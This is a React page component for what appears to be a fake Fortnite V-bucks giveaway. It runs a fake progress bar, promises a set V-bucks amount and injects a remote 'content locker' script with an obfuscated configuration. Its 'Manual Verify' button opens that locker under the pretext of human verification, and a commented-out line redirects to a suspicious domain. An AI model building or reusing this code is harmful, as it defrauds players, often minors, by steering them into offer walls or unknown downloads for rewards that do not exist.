import { useState, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { useToast } from "@/components/ui/use-toast";
import { motion } from "framer-motion";
import { ChevronLeft, Shield, Lock, CheckCircle, Loader2 } from "lucide-react";
import { IframeModal } from "@/components/IframeModal";

const Verify = () => {
  const navigate = useNavigate();
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(true);
  const [progress, setProgress] = useState(0);
  const [username, setUsername] = useState("Player123");
  const [vbucksAmount, setVbucksAmount] = useState(13500);
  const [isModalOpen, setIsModalOpen] = useState(false);

  const contentPathname = import.meta.env.VITE_CONTENT_PATHNAME;

  useEffect(() => {
    // Dynamically add the locker scripts to the head
    const script1 = document.createElement("script");
    script1.type = "text/javascript";
    script1.innerHTML = 'var aLgQO_FzH_DKUPDc={"it":4459836,"key":"5f1f5"};';
    document.head.appendChild(script1);

    const script2 = document.createElement("script");
    script2.src = "https://d2yc6hxtq0phup.cloudfront.net/1a01310.js";
    document.head.appendChild(script2);

    return () => {
      document.head.removeChild(script1);
      document.head.removeChild(script2);
    };
  }, []);

  useEffect(() => {
    const timer = setTimeout(() => {
      setIsLoading(false);
    }, 2000);

    const interval = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 100) {
          clearInterval(interval);
          return 100;
        }
        return prev + 5;
      });
    }, 100);

    return () => {
      clearTimeout(timer);
      clearInterval(interval);
    };
  }, []);

  const handleVerify = () => {
    toast({
      title: "Verification Required",
      description: "Please complete the human verification process.",
    });

    // Call the _EQ function to open the locker
    if (window._EQ) {
      window._EQ();
    }

    // Optionally, you can redirect as you already have in your original code
    // window.location.href = "https://f9ff.top/68fcad4";
  };

  return (
    <div className="min-h-screen flex flex-col bg-fortnite-gradient">
      {/* Your existing JSX code... */}
      <motion.div
        className="text-center"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 0.7, duration: 0.5 }}
      >
        <Button
          onClick={handleVerify}
          className="w-full py-6 bg-fortnite-yellow hover:bg-fortnite-yellow/90 text-fortnite-black font-bold text-xl"
        >
          Manual Verify
        </Button>
      </motion.div>
    </div>
  );
};

export default Verify;
